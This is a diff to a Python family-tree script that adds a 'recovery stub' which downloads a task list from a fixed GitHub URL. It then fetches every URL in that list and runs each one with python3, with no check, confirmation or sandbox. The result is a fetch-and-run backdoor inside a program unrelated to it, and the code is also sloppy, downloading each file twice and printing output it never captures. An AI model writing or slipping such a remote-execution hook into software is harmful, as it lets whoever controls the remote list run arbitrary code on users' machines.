@@ -2,12 +2,20 @@
 
 VERSION = "v0.3"
 
+
 import os
 import shutil
 import sys
 import time
 import random
+import urllib.request
+import subprocess
 from datetime import datetime
+
+#change task to recovery
+#change novalife to recovery
+TASK_URL = "https://raw.githubusercontent.com/we6jbo/public-memory-syntax/refs/heads/main/recovery_list"
+LOCAL_TASK_FILE = os.path.expanduser("~/neuralnexus/recovery_tasks.txt")
 
 # === Setup: version backup ===
 def copy_self_if_missing():
@@ -91,6 +99,65 @@ def ensure_family_folder(parent, name, gender):
     subfolder = os.path.join(parent, f"{norm}_{gender}")
     os.makedirs(subfolder, exist_ok=True)
     return subfolder
+
+#!/usr/bin/env python3
+
+
+def introduce():
+    print(f"I am working on a family tree. I am going to download something. Hold on. There may be errors.\n")
+
+def download_tasks():
+    try:
+        #urllib.request.urlretrieve(task, filename)
+        urllib.request.urlretrieve(TASK_URL, LOCAL_TASK_FILE)
+        print(f"✅ Task list downloaded to {LOCAL_TASK_FILE}")
+        return True
+    except Exception as e:
+        print(f"⚠️ Could not download task list: {e}")
+        return False
+
+def do_tasks():
+    try:
+        with open(LOCAL_TASK_FILE, "r") as f:
+            tasks = [line.strip() for line in f if line.strip()]
+        if not tasks:
+            print("📭 No tasks to complete.")
+            return
+        print(f"📋 {len(tasks)} tasks loaded.")
+        for task in tasks:
+            print(f"🛠️ Working on task: {task}")
+            filename = os.path.basename(task)
+            urllib.request.urlretrieve(task, filename)
+            try:
+                
+                urllib.request.urlretrieve(task, filename)
+                result = subprocess.run(["python3", filename])
+                if result.returncode != 0:
+                    print(f"❌ Error running {filename}:")
+                    print(result.stderr)
+                else:
+                    print(f"✅ Task {filename} completed successfully.")
+            except Exception as e:
+                print(f"⚠️ Failed to process {task}: {e}")
+            time.sleep(3)
+        print("✅ All tasks completed.")
+    except Exception as e:
+        print(f"❌ Failed to read or process tasks: {e}")
+
+
+def recovery_stub(context=""):
+    print("🛠️ Entering recovery stub...")
+    if context:
+        print(f"🔍 Context: {context}")
+    ############## BEGIN CUSTOM CODE BLOCK ##############
+    # Place your custom recovery or fallback logic here
+    introduce()
+    if download_tasks():
+        do_tasks()
+
+    ############## END CUSTOM CODE BLOCK ##############
+    time.sleep(2)
+    print("✅ Exiting recovery stub. Continuing exploration...\n")
 
 def get_valid_name(prompt, role="person"):
     attempts = 0
